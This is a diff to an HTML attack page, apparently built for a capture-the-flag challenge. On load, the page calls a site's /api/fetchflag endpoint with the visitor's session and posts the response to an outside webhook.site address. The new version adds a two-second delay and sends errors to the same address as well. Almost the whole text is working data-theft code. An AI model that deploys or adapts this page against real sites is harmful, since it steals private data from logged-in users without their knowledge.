@@ -1,18 +1,27 @@
-<!-- public/steal.html (or on your external server) -->
 <!DOCTYPE html>
 <html>
-<head><title>Malicious</title></head>
-<body>
-<script>
-fetch("/api/fetchflag")
-  .then(res => res.json())
-  .then(data => {
-    fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
-  });
-</script>
-</body>
+  <body>
+    <h1>Exfiltrating the flag...</h1>
+    <script>
+      // Wait a little to make sure everything is ready
+      setTimeout(() => {
+        fetch("/api/fetchflag")
+          .then(res => res.text())
+          .then(flag => {
+            fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ flag })
+            });
+          })
+          .catch(err => {
+            fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
+              method: "POST",
+              headers: { "Content-Type": "text/plain" },
+              body: "Error: " + err.message
+            });
+          });
+      }, 2000); // 2 second delay to make sure cookies/session are ready
+    </script>
+  </body>
 </html>
